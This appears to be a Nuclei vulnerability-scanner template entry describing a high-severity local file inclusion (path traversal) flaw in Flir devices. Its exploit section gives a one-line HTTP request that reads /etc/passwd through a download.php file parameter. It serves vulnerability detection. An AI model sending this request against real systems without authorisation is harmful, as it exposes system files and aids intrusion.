# Nuclei Template: Flir - Local File Inclusion
**Template ID:** flir-path-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`flir-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Flir is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=/etc/passwd
```

## References
- https://juejin.cn/post/6961370156484263972
